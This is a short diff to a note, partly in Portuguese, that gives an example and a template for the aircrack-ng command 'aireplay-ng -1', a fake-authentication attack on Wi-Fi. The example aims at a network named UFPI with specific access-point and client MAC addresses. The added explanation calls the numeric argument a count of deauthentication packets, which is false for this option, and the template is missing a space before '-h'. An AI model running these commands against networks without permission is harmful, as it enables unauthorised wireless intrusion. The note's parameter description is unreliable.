@@ -1,11 +1,13 @@
 
 Exemplo:
 
-#aireplay-ng -1 0 -e UFPI -a 74:A2:E6:EB:CD:30 -h 44:1C:A8:C0:DF:EF wlp6s0
+#aireplay-ng -1 10 -e UFPI -a 74:A2:E6:EB:CD:30 -h 44:1C:A8:C0:DF:EF wlp6s0
 
 Template:
 
-aireplay-ng -1 0 -e NameNetwork -a zz:zz:zz:zz:zz:zz-h aa:aa:aa:aa:aa:aa Interface
+aireplay-ng -1 N -e NameNetwork -a zz:zz:zz:zz:zz:zz-h aa:aa:aa:aa:aa:aa Interface
+
+N - is the number of packets DeAuth.
 
 zz:zz:zz:zz:zz:zz - MAC do Acess Point.
 
